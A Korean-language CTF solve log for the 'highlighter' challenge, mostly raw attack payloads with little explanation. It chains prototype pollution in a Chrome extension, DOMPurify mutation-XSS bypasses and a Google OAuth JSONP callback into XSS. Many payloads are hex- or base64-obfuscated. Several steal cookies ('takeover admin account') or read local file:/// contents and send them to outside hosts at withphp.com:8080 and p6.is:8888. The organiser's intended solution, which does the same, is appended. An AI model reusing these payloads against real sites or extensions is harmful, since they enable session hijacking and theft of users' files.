삽질했던거 정리

prob site : http://highlighter.ctf.defenit.kr/


function pwn(a,b) {
    var post = a;
    var keyword = b;
    chrome.runtime.sendMessage(
        { content: post, keyword },
        function (response) {
            console.log(response);
        }   
    );
}

({})['__proto__']['__defineGetter__']('foo',function(){return 'x';})

pwn(`n`,`({})['__proto__']['__defineGetter__']('polluted',function(){return'xxx';})`);
pwn(`n`,`({})['__proto__']['__defineGetter__']('foo',function(){return 'x';})`);





({})['__proto__']['__defineGetter__']('foo',function(){return(document.body.innerHTML='[payload]')})




step 1. prototype pollution
({})['__proto__']['__defineGetter__']('polluted',function(){return'\x3cimg\x20src="x"\x20onerror=alert(1)>';})






step 2. dompurify bypass (SAFE_FOR_JQUERY : TRUE 일 때):



<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1);alert"></script>



<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">

http://highlighter.ctf.defenit.kr/read?id=115#({})['__proto__']['__defineGetter__']('foo',function(){return(n('aaaa'));})




pwn(`n`,`({})['__proto__']['__defineGetter__']('foo',function(){return'<img alt="<x" title="/><img src=x onerror=alert(1)>">';})`);



pwn(`n`,`({})['__proto__']['__defineGetter__']('foo',function(){return'\x3c\x69\x6d\x67\x20\x61\x6c\x74\x3d\x22\x3c\x78\x22\x20\x74\x69\x74\x6c\x65\x3d\x22\x2f\x3e\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x78\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e\x22\x3e';})`);






step 3. xss :

#({})['__proto__']['__defineGetter__']('foo',function(){return(document.body.innerHTML='\x3c\x73\x63\x72\x69\x70\x74\x20\x73\x72\x63\x3d\x22\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x63\x63\x6f\x75\x6e\x74\x73\x2e\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d\x2f\x6f\x2f\x6f\x61\x75\x74\x68\x32\x2f\x72\x65\x76\x6f\x6b\x65\x3f\x63\x61\x6c\x6c\x62\x61\x63\x6b\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3b\x61\x6c\x65\x72\x74\x22\x3e\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e')})


http://highlighter.ctf.defenit.kr/read?id=72#({})['__proto__']['__defineGetter__']('foo',function(){return(document.body.innerHTML='\x3c\x73\x63\x72\x69\x70\x74\x20\x73\x72\x63\x3d\x22\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x63\x63\x6f\x75\x6e\x74\x73\x2e\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d\x2f\x6f\x2f\x6f\x61\x75\x74\x68\x32\x2f\x72\x65\x76\x6f\x6b\x65\x3f\x63\x61\x6c\x6c\x62\x61\x63\x6b\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3b\x61\x6c\x65\x72\x74\x22\x3e\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e')})


http://highlighter.ctf.defenit.kr/read?id=115#({})['__proto__']['__defineGetter__']('foo',function(){return'\x3c\x69\x6d\x67\x20\x61\x6c\x74\x3d\x22\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x2f\x2f\x22\x20\x74\x69\x74\x6c\x65\x3d\x22\x2f\x3e\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x78\x20\x78\x6e\x65\x72\x72\x6f\x72\x3d\x22\x61\x6c\x65\x72\x74\x28\x31\x29\x20\x73\x70\x61\x6e\x3d\x22\x3c\x78\x22\x20\x6f\x3e\x22';})




reference :


https://blog.p6.is/bypassing-a-js-sandbox/

https://research.securitum.com/dompurify-bypass-using-mxss/

https://masatokinugawa.l0.cm/







--- 

payload

({})['__proto__']['__defineGetter__']('foo',function(){return'<img alt="onerror=alert(1)//" title="/><img src=x xnerror="alert(1) span="<x" o>"';})


http://highlighter.ctf.defenit.kr/read?id=115#({})['__proto__']['__defineGetter__']('foo',function(){return'\x3c\x69\x6d\x67\x20\x61\x6c\x74\x3d\x22\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x2f\x2f\x22\x20\x74\x69\x74\x6c\x65\x3d\x22\x2f\x3e\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x78\x20\x78\x6e\x65\x72\x72\x6f\x72\x3d\x22\x61\x6c\x65\x72\x74\x28\x31\x29\x20\x73\x70\x61\x6e\x3d\x22\x3c\x78\x22\x20\x6f\x3e\x22';})



takeover admin account

\x3c\x69\x6d\x67\x20\x61\x6c\x74\x3d\x22\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x6c\x6f\x63\x61\x74\x69\x6f\x6e\x3d\x60\x2f\x2f\x77\x69\x74\x68\x70\x68\x70\x2e\x63\x6f\x6d\x3a\x38\x30\x38\x30\x2f\x3f\x60\x2b\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x63\x6f\x6f\x6b\x69\x65\x2f\x2f\x22\x20\x74\x69\x74\x6c\x65\x3d\x22\x2f\x3e\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x78\x20\x78\x6e\x65\x72\x72\x6f\x72\x3d\x22\x61\x6c\x65\x72\x74\x28\x31\x29\x20\x73\x70\x61\x6e\x3d\x22\x3c\x78\x22\x20\x6f\x3e\x22

http://highlighter.ctf.defenit.kr/read?id=115#({})['__proto__']['__defineGetter__']('foo',function(){return'\x3c\x69\x6d\x67\x20\x61\x6c\x74\x3d\x22\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x6c\x6f\x63\x61\x74\x69\x6f\x6e\x3d\x60\x2f\x2f\x77\x69\x74\x68\x70\x68\x70\x2e\x63\x6f\x6d\x3a\x38\x30\x38\x30\x2f\x3f\x60\x2b\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x63\x6f\x6f\x6b\x69\x65\x2f\x2f\x22\x20\x74\x69\x74\x6c\x65\x3d\x22\x2f\x3e\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x78\x20\x78\x6e\x65\x72\x72\x6f\x72\x3d\x22\x61\x6c\x65\x72\x74\x28\x31\x29\x20\x73\x70\x61\x6e\x3d\x22\x3c\x78\x22\x20\x6f\x3e\x22';})

http://highlighter.ctf.defenit.kr/read?id=34#({})['__proto__']['__defineGetter__']('foo',function(){return'\x3c\x69\x6d\x67\x20\x61\x6c\x74\x3d\x22\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x65\x76\x61\x6c\x28\x61\x74\x6f\x62\x28\x60\x64\x6d\x46\x79\x49\x48\x4a\x6c\x63\x53\x41\x39\x49\x47\x35\x6c\x64\x79\x42\x59\x54\x55\x78\x49\x64\x48\x52\x77\x55\x6d\x56\x78\x64\x57\x56\x7a\x64\x43\x67\x70\x4f\x77\x70\x79\x5a\x58\x45\x75\x62\x33\x42\x6c\x62\x69\x67\x69\x52\x30\x56\x55\x49\x69\x77\x67\x49\x6d\x5a\x70\x62\x47\x55\x36\x4c\x79\x38\x76\x63\x6d\x56\x6b\x59\x57\x4e\x30\x5a\x57\x51\x76\x5a\x6d\x78\x68\x5a\x79\x49\x73\x49\x47\x5a\x68\x62\x48\x4e\x6c\x4b\x54\x73\x4b\x63\x6d\x56\x78\x4c\x6e\x4e\x6c\x62\x6d\x51\x6f\x4b\x54\x73\x4b\x62\x47\x39\x6a\x59\x58\x52\x70\x62\x32\x34\x39\x49\x6d\x68\x30\x64\x48\x41\x36\x4c\x79\x39\x33\x61\x58\x52\x6f\x63\x47\x68\x77\x4c\x6d\x4e\x76\x62\x54\x6f\x34\x4d\x44\x67\x77\x4c\x7a\x38\x69\x4b\x33\x4a\x6c\x63\x53\x35\x79\x5a\x58\x4e\x77\x62\x32\x35\x7a\x5a\x54\x73\x60\x29\x29\x2f\x2f\x22\x20\x74\x69\x74\x6c\x65\x3d\x22\x2f\x3e\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x78\x20\x78\x6e\x65\x72\x72\x6f\x72\x3d\x22\x61\x6c\x65\x72\x74\x28\x31\x29\x20\x73\x70\x61\x6e\x3d\x22\x3c\x78\x22\x20\x6f\x3e\x22';})

<img alt="onerror=eval(atob(`dmFyIHJlcSA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwpyZXEub3BlbigiR0VUIiwgImZpbGU6Ly8vcmVkYWN0ZWQvZmxhZyIsIGZhbHNlKTsKcmVxLnNlbmQoKTsKbG9jYXRpb249Imh0dHA6Ly93aXRocGhwLmNvbTo4MDgwLz8iK3JlcS5yZXNwb25zZTs`))//" title="/><img src=x xnerror="alert(1) span="<x" o>"


http://highlighter.ctf.defenit.kr/read?id=30#({})['__proto__']['__defineGetter__']('foo',function(){return(e\
val(atob(`dmFyIHJlcSA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwpyZXEub3BlbigiR0VUIiwgImZpbGU6Ly8vcmVkYWN0ZWQvZmxhZyIsIGZhbHNlKTsKcmVxLnNlbmQoKTsKdmFyIHJlcTIgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTsKcmVxMi5vcGVuKCJHRVQiLCAiaHR0cDovL3dpdGhwaHAuY29tOjgwODAvPyIrcmVxLnJlc3BvbnNlLCBmYWxzZSk7CnJlcTIuc2VuZCgpOw`)))})


+

posix(출제자)의 정풀이

http://highlighter.ctf.defenit.kr/read?id=1#({})['__proto__']['__defineGetter__']('a',function(){return('\x3cstyle\x3e\x3cstyle/\x3e\x3cscript/src=https://accounts.google.com/o/oauth2/revoke?callback=eval(atob(/ZnVuY3Rpb24gZmV0Y2hMb2NhbFJlc291cmNlKHVybCkgeyAgICAgICAgCiAgICBjb25zdCByZXEgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTsgICAgCiAgICByZXEub25sb2FkID0gZnVuY3Rpb24oKSB7CiAgICAgICAgY29uc3QgdGV4dCA9IHJlcS5yZXNwb25zZVRleHQ7ICAKICAgICAgICBmZXRjaCgnaHR0cDovL3A2LmlzOjg4ODgnLCB7Im1ldGhvZCI6ICJQT1NUIiwgImJvZHkiOiBlbmNvZGVVUkkodGV4dCl9KTsKICAgIH07ICAgIAogICAgcmVxLm9wZW4oJ0dFVCcsIHVybCk7CiAgICByZXEuc2VuZCgpOwp9OwoKZmV0Y2hMb2NhbFJlc291cmNlKCdmaWxlOi8vLycp/.source))\x3e\x3c/script\x3e');})